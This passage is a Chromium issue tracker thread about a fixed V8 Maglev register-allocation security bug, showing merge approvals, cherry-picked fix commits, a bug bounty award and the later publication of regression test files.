3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: eakpobaro (Android), eakpobaro (iOS), gmpritchard (ChromeOS), danielyip (Desktop)

### ap...@google.com (2025-01-10)

[Details redacted due to bug visibility]

Change-Id: I19db77ca1638270b0e998e261355ec798b55c771
https://chrome-internal-review.googlesource.com/7941626


### pb...@google.com (2025-01-10)

Your change has been approved to M133 branch, Please goahead and get the CL merged asap so that it would be part of next week M133 Beta promotion.

### am...@chromium.org (2025-01-10)

No merges are needed for 130 Extended or 131 Stable; this will need to be reviewed for M132, which will be promoted to Stable on Tuesday. Since this fix just landed a little over 24 hours ago, we'll keep this in the review queue for Monday to be reviewed at that time after sufficient bake time since this is going into Stable.

### ol...@chromium.org (2025-01-13)

Merge review:

1. security
2. The one in BixedByCodeChanges
3. y
   4-6: no

### am...@chromium.org (2025-01-13)

<https://crrev.com/c/6157748> approved for merge to 132, please merge to 13.2 at your earliest convenience (NLT EOD Thursday, 16 January)

### ap...@google.com (2025-01-13)

Project: v8/v8  

Branch: main  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6172031>

[maglev][refactoring] Cleanup handling of unreachable blocks

---


Expand for full commit details
```
[maglev][refactoring] Cleanup handling of unreachable blocks 
 
* Clear is_resumable_loop flag when we clear is_loop to avoid confusion 
  in the future. 
* Rename IsUnreachable to IsUnreachableByForwardEdge (since it can still 
  be reachable by exception handling or back-edge in the case of 
  resumable loops). 
 
Bug: 386143468 
Change-Id: I2496c72672e2a93c8f2770dd1592b94e0821945d 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6172031 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Cr-Commit-Position: refs/heads/main@{#98068}

```

---

Files:

- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-interpreter-frame-state.h`
- M `src/maglev/maglev-regalloc.cc`

---

Hash: 57735707902db3902017129c720df70e00a870f8  

Date:  Mon Jan 13 10:16:58 2025


---

### ap...@google.com (2025-01-13)

Project: v8/v8  

Branch: refs/branch-heads/13.3  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6172032>

Merged: [maglev] regalloc: handle non-loop resumable\_loops

---


Expand for full commit details
```
Merged: [maglev] regalloc: handle non-loop resumable_loops 
 
Resumable loops which are not loops can be either: 
 
1. An unreachable loop with only a back-edge 
2. A fall-through to a resumable loop with a dead back-edge 
 
Only (1) starts with an empty register state. 
 
Fixed: 386143468 
(cherry picked from commit b44bd24761f1a2eae131bd90be15b5a68cc70f83) 
 
Change-Id: Iec24477dc1f15f9d438f56749696d533e72204a4 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6172032 
Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.3@{#12} 
Cr-Branched-From: 41dacffe436aeb9311879cb07648f1e36609a804-refs/heads/13.3.415@{#1} 
Cr-Branched-From: 3348638c0af67c885b30891a358c89a917ac9759-refs/heads/main@{#97937}

```

---

Files:

- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-interpreter-frame-state.h`
- M `src/maglev/maglev-regalloc.cc`

---

Hash: 088f4976d8db1965848d72349f036475abd80535  

Date:  Wed Jan 08 16:06:43 2025


---

### pe...@google.com (2025-01-13)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### pb...@google.com (2025-01-15)

[Bulk Edit] Your changes have been approved for merging into the M133 branch. Please merge them as soon as possible to ensure they receive sufficient beta coverage and are included in next week's beta release.

### pe...@google.com (2025-01-16)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-01-16)

1. https://chromium-review.googlesource.com/c/v8/v8/+/6172672
2. Medium - There was a small conflict.
3. 133
4. Yes. According to the "Some Thoughts" section in the description[1], this bug might be introduced from 2022 by https://chromium-review.googlesource.com/c/v8/v8/+/3918093.

[1] https://g-issues.chromium.org/issues/386143468#comment1


### ap...@google.com (2025-01-16)

Project: v8/v8  

Branch: refs/branch-heads/13.2  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6172463>

Merged: [maglev] regalloc: handle non-loop resumable\_loops

---


Expand for full commit details
```
Merged: [maglev] regalloc: handle non-loop resumable_loops 
 
Resumable loops which are not loops can be either: 
 
1. An unreachable loop with only a back-edge 
2. A fall-through to a resumable loop with a dead back-edge 
 
Only (1) starts with an empty register state. 
 
Fixed: 386143468 
(cherry picked from commit b44bd24761f1a2eae131bd90be15b5a68cc70f83) 
 
Change-Id: I9ebb028fe17c6f1de00825837acec6f8169dbf67 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6172463 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
Cr-Commit-Position: refs/branch-heads/13.2@{#60} 
Cr-Branched-From: 24068c59cedad9ee976ddc05431f5f497b1ebd71-refs/heads/13.2.152@{#1} 
Cr-Branched-From: 6054ba94db0969220be4f94dc1677fc4696bdc4f-refs/heads/main@{#97085}

```

---

Files:

- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-interpreter-frame-state.h`
- M `src/maglev/maglev-regalloc.cc`

---

Hash: 97e828af5cbcf50c3ff0064a4a5c22e18c18b4b5  

Date:  Wed Jan 08 16:06:43 2025


---

### pe...@google.com (2025-01-17)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### am...@chromium.org (2025-01-17)

merges have already been completed

### sp...@google.com (2025-01-17)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $11000.00 for this report.

Rationale for this decision:
$10,000 for high quality report of memory corruption in a sandboxed process / renderer + $1,000 bisect bonus


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-01-17)

Congratulations 303f06e3! Thank you for your efforts and reporting this issue to us -- nice work!

### ap...@google.com (2025-02-19)

Project: v8/v8  

Branch: refs/branch-heads/12.6  

Author: Olivier Flückiger <[olivf@chromium.org](mailto:olivf@chromium.org)>  

Link:      <https://chromium-review.googlesource.com/6172672>

[M126-LTS][maglev] regalloc: handle non-loop resumable\_loops

---


Expand for full commit details
```
[M126-LTS][maglev] regalloc: handle non-loop resumable_loops 
 
Resumable loops which are not loops can be either: 
 
1. An unreachable loop with only a back-edge 
2. A fall-through to a resumable loop with a dead back-edge 
 
Only (1) starts with an empty register state. 
 
(cherry picked from commit b44bd24761f1a2eae131bd90be15b5a68cc70f83) 
 
Fixed: 386143468 
Change-Id: I67d6e042e44915ec5719fe8dfe840dbb28079d28 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6157748 
Auto-Submit: Olivier Flückiger <olivf@chromium.org> 
Commit-Queue: Toon Verwaest <verwaest@chromium.org> 
Commit-Queue: Olivier Flückiger <olivf@chromium.org> 
Reviewed-by: Toon Verwaest <verwaest@chromium.org> 
Cr-Original-Commit-Position: refs/heads/main@{#98016} 
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/6172672 
Commit-Queue: Darius Mercadier <dmercadier@chromium.org> 
Reviewed-by: Darius Mercadier <dmercadier@chromium.org> 
Cr-Commit-Position: refs/branch-heads/12.6@{#92} 
Cr-Branched-From: 3c9fa12db3183a6f4ea53d2675adb66ea1194529-refs/heads/12.6.228@{#2} 
Cr-Branched-From: 981bb15ba4dbf9e2381dfc94ec2c4af0b9c6a0b6-refs/heads/main@{#93835}

```

---

Files:

- M `src/maglev/maglev-interpreter-frame-state.cc`
- M `src/maglev/maglev-interpreter-frame-state.h`
- M `src/maglev/maglev-regalloc.cc`

---

Hash: 14d323f551b50b8fa4d347190ff5dd7a42e7fa2e  

Date:  Wed Jan 08 16:06:43 2025


---

### ch...@google.com (2025-04-18)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### dx...@google.com (2026-05-29)

Project: v8/v8  

Branch:  main  

Author:  Michael Lippautz [mlippautz@chromium.org](mailto:mlippautz@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7883401>

compiler,maglev: Move regression tests into public repo

---


Expand for full commit details
```
     
    Bug: 517688821 
     
    Bug: 390465670 
    Bug: 390743124 
    Bug: 40061538 
    Bug: 378014589 
    Bug: 386143468 
    Bug: 391412545 
    Bug: 398065918 
    Bug: 445380761 
    Bug: 490558172 
    Bug: 491410818 
    Bug: 491884710 
    Bug: 495679730 
    Change-Id: I0a68712b7a4d20dc6b31d8e8d714e2124989c3fd 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7883401 
    Auto-Submit: Michael Lippautz <mlippautz@chromium.org> 
    Reviewed-by: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Michael Lippautz <mlippautz@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#107658}

```

---

Files:

- A `test/mjsunit/compiler/regress-390465670.js`
- A `test/mjsunit/compiler/regress-390743124.js`
- A `test/mjsunit/compiler/regress-40061538.js`
- A `test/mjsunit/maglev/regress-378014589.js`
- A `test/mjsunit/maglev/regress-386143468.js`
- A `test/mjsunit/maglev/regress-391412545.js`
- A `test/mjsunit/maglev/regress-398065918.js`
- A `test/mjsunit/maglev/regress-445380761.js`
- A `test/mjsunit/maglev/regress-490558172-3.js`
- A `test/mjsunit/maglev/regress-490558172-4.js`
- A `test/mjsunit/maglev/regress-491410818-1.js`
- A `test/mjsunit/maglev/regress-491410818-2.js`
- A `test/mjsunit/maglev/regress-491410818-3.js`
- A `test/mjsunit/maglev/regress-491884710-1.js`
- A `test/mjsunit/maglev/regress-491884710-2.js`
- A `test/mjsunit/maglev/regress-495679730-1.js`
- A `test/mjsunit/maglev/regress-495679730-2.js`

---

Hash: [0afe75e63ce8615ed10775b59e9ff6f3a1205a04](https://chromiumdash.appspot.com/commit/0afe75e63ce8615ed10775b59e9ff6f3a1205a04)  

Date: Fri May 29 12:04:33 2026


---

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/386143468)*
